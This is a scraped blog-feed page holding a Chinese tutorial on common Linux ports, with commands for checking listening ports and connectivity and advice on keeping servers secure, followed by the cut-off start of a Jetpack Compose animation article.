                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Linux 系统中，端口（Port）是网络通信的逻辑通道，范围从 <strong>0 到 65535</strong>。其中 <strong>0–1023</strong> 被称为 <strong>“知名端口”（Well-Known Ports）</strong> ，通常由系统服务使用，需要 root 权限才能绑定。</p>
<p>下面列出 <strong>Linux 环境中最常见、最实用的端口及其作用</strong>，按类别分类，便于理解和运维。</p>
<hr/>
<h2 data-id="heading-0">🔑 一、系统与基础服务端口</h2>









































<table><thead><tr><th>端口</th><th>协议</th><th>服务/用途</th><th>说明</th></tr></thead><tbody><tr><td><strong>22</strong></td><td>TCP</td><td><strong>SSH</strong>（Secure Shell）</td><td>远程登录、文件传输（scp/sftp），<strong>Linux 最重要的管理端口</strong></td></tr><tr><td><strong>23</strong></td><td>TCP</td><td>Telnet</td><td>明文远程登录（<strong>不安全，已淘汰</strong>）</td></tr><tr><td><strong>53</strong></td><td>TCP/UDP</td><td><strong>DNS</strong>（Domain Name System）</td><td>域名解析，UDP 用于查询，TCP 用于区域传输</td></tr><tr><td><strong>123</strong></td><td>UDP</td><td><strong>NTP</strong>（Network Time Protocol）</td><td>时间同步（如 <code>chrony</code>、<code>ntpd</code>）</td></tr><tr><td><strong>161/162</strong></td><td>UDP</td><td><strong>SNMP</strong>（Simple Network Management Protocol）</td><td>网络设备监控（161 查询，162 告警）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">🌐 二、Web 与 HTTP 相关端口</h2>





















































<table><thead><tr><th>端口</th><th>协议</th><th>服务/用途</th><th>说明</th></tr></thead><tbody><tr><td><strong>80</strong></td><td>TCP</td><td><strong>HTTP</strong></td><td>标准 Web 服务（明文）</td></tr><tr><td><strong>443</strong></td><td>TCP</td><td><strong>HTTPS</strong></td><td>加密 Web 服务（SSL/TLS）</td></tr><tr><td><strong>8080</strong></td><td>TCP</td><td>HTTP 代理 / 备用 Web 端口</td><td>常用于开发测试、反向代理后端（如 Tomcat、Gunicorn）</td></tr><tr><td><strong>8443</strong></td><td>TCP</td><td>HTTPS 备用端口</td><td>常用于管理界面（如 Jenkins、Kubernetes Dashboard）</td></tr><tr><td><strong>3000</strong></td><td>TCP</td><td>开发服务器常用端口</td><td>Node.js（Express）、Grafana 默认端口</td></tr><tr><td><strong>5000</strong></td><td>TCP</td><td>Flask 开发默认端口</td><td>Python Flask 应用常用</td></tr><tr><td><strong>8000</strong></td><td>TCP</td><td>Django / Gunicorn / FastAPI</td><td>Python Web 框架常用部署端口</td></tr></tbody></table>
<blockquote>
<p>💡 提示：80/443 是浏览器默认端口，访问 <code>http://example.com</code> 实际是 <code>:80</code>，无需写端口。</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">🗄️ 三、数据库端口</h2>















































<table><thead><tr><th>端口</th><th>数据库</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td><strong>3306</strong></td><td>MySQL / MariaDB</td><td>TCP</td><td>最流行的开源关系型数据库</td></tr><tr><td><strong>5432</strong></td><td>PostgreSQL</td><td>TCP</td><td>高级开源关系型数据库</td></tr><tr><td><strong>27017</strong></td><td>MongoDB</td><td>TCP</td><td>NoSQL 文档数据库</td></tr><tr><td><strong>6379</strong></td><td>Redis</td><td>TCP</td><td>内存键值存储（缓存/消息队列）</td></tr><tr><td><strong>9200</strong></td><td>Elasticsearch</td><td>TCP</td><td>分布式搜索与分析引擎（REST API）</td></tr><tr><td><strong>11211</strong></td><td>Memcached</td><td>TCP/UDP</td><td>分布式内存对象缓存系统</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-3">📦 四、应用与中间件端口</h2>


















































<table><thead><tr><th>端口</th><th>服务</th><th>用途</th></tr></thead><tbody><tr><td><strong>2181</strong></td><td>ZooKeeper</td><td>分布式协调服务（Kafka/Hadoop 依赖）</td></tr><tr><td><strong>9092</strong></td><td>Kafka</td><td>消息队列 broker 端口</td></tr><tr><td><strong>8081</strong></td><td>Nexus / Artifactory</td><td>私有 Maven/PyPI 仓库</td></tr><tr><td><strong>9000</strong></td><td>Portainer / MinIO</td><td>Docker 可视化管理 / 对象存储</td></tr><tr><td><strong>8888</strong></td><td>Jupyter Notebook</td><td>数据科学交互式开发环境</td></tr><tr><td><strong>25 / 465 / 587</strong></td><td>SMTP</td><td>邮件发送服务（25 明文，465/587 加密）</td></tr><tr><td><strong>110 / 995</strong></td><td>POP3</td><td>邮件接收（110 明文，995 SSL）</td></tr><tr><td><strong>143 / 993</strong></td><td>IMAP</td><td>邮件同步协议（143 明文，993 SSL）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">🛠️ 五、监控与可观测性端口</h2>








































<table><thead><tr><th>端口</th><th>服务</th><th>用途</th></tr></thead><tbody><tr><td><strong>9090</strong></td><td>Prometheus</td><td>时序数据库 + 监控服务</td></tr><tr><td><strong>9100</strong></td><td>Node Exporter</td><td>主机指标采集器（CPU/内存/磁盘等）</td></tr><tr><td><strong>3000</strong></td><td>Grafana</td><td>可视化仪表盘（常与 Prometheus 配合）</td></tr><tr><td><strong>3100</strong></td><td>Loki</td><td>日志聚合系统（Grafana Labs）</td></tr><tr><td><strong>7946</strong></td><td>Docker Swarm</td><td>容器集群管理通信</td></tr><tr><td><strong>9093</strong></td><td>Alertmanager</td><td>Prometheus 告警路由服务</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">🔒 六、安全与防火墙相关</h2>

















<table><thead><tr><th>端口</th><th>用途</th></tr></thead><tbody><tr><td><strong>所有非标准端口</strong></td><td>建议在生产环境中<strong>限制访问源 IP</strong>（如只允许办公网段访问 22、3306）</td></tr><tr><td><strong>0.0.0.0 vs 127.0.0.1</strong></td><td/></tr></tbody></table>
<ul>
<li><code>0.0.0.0:8000</code> → 所有网络接口可访问（<strong>公网暴露！</strong> ）</li>
<li><code>127.0.0.1:8000</code> → 仅本机可访问（<strong>更安全，配合 Nginx 反向代理</strong>） |</li>
</ul>
<hr/>
<h2 data-id="heading-6">🧪 七、如何查看当前监听的端口？</h2>
<h3 data-id="heading-7">1. 查看所有监听端口</h3>
<pre><code class="hljs language-bash" lang="bash">ss -tuln
<span class="hljs-comment"># 或</span>
netstat -tuln
</code></pre>
<h3 data-id="heading-8">2. 查看某端口被哪个进程占用</h3>
<pre><code class="hljs language-perl" lang="perl">sudo lsof -i :<span class="hljs-number">8000</span>
<span class="hljs-comment"># 或</span>
sudo ss -tulnp | <span class="hljs-keyword">grep</span> :<span class="hljs-number">8000</span>
</code></pre>
<h3 data-id="heading-9">3. 测试端口是否可达（本地）</h3>
<pre><code class="hljs language-arduino" lang="arduino">curl http:<span class="hljs-comment">//127.0.0.1:8000</span>
telnet <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">8000</span>
</code></pre>
<h3 data-id="heading-10">4. 测试远程端口连通性（从本地电脑）</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">telnet</span> <span class="hljs-string">your-ecs-ip</span> <span class="hljs-number">8000</span>
<span class="hljs-comment"># 或</span>
<span class="hljs-string">nc</span> <span class="hljs-string">-zv</span> <span class="hljs-string">your-ecs-ip</span> <span class="hljs-number">8000</span>
</code></pre>
<hr/>
<h2 data-id="heading-11">🛡️ 八、安全建议（生产环境）</h2>
<ol>
<li>
<p><strong>最小开放原则</strong>：只开放必要端口（如 Web 服务开 80/443，管理开 22）</p>
</li>
<li>
<p><strong>限制来源 IP</strong>：</p>
<ul>
<li>SSH（22）只允许公司/家庭 IP</li>
<li>数据库（3306）只允许应用服务器 IP</li>
</ul>
</li>
<li>
<p><strong>避免直接暴露应用端口</strong>：</p>
<ul>
<li>不要直接开放 8000、3000 给公网</li>
<li>用 <strong>Nginx/Apache 反向代理 + HTTPS</strong></li>
</ul>
</li>
<li>
<p><strong>定期扫描端口</strong>：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">nmap -sV your-<span class="hljs-built_in">server</span>-ip
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-12">✅ 总结：高频端口速查表</h2>













































<table><thead><tr><th>场景</th><th>推荐端口</th><th>是否开放公网</th></tr></thead><tbody><tr><td>SSH 远程管理</td><td>22</td><td>✅（限 IP）</td></tr><tr><td>Web 网站</td><td>80 / 443</td><td>✅</td></tr><tr><td>Flask/Django 后端</td><td>8000 / 5000</td><td>❌（应通过 Nginx 代理）</td></tr><tr><td>MySQL</td><td>3306</td><td>❌（仅内网）</td></tr><tr><td>Redis</td><td>6379</td><td>❌（禁止公网！）</td></tr><tr><td>Prometheus</td><td>9090</td><td>❌（或加认证）</td></tr><tr><td>Grafana</td><td>3000</td><td>❌（或加认证/反向代理）</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>记住</strong>：<br/>
<strong>“能不开就不开，能限 IP 就限 IP，能走内网就走内网”</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[五分钟实战 Compose 展开/收起动画]]></title>    <link>https://juejin.cn/post/7576130918078251043</link>    <guid>https://juejin.cn/post/7576130918078251043</guid>    <pubDate>2025-11-25T00:56:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576130918078251043" data-draft-id="7573892650816077839" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="五分钟实战 Compose 展开/收起动画"/> <meta itemprop="keywords" content="Android,Kotlin"/> <meta itemprop="datePublished" content="2025-11-25T00:56:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            五分钟实战 Compose 展开/收起动画
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:56:34.000Z" title="Tue Nov 25 2025 00:56:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img 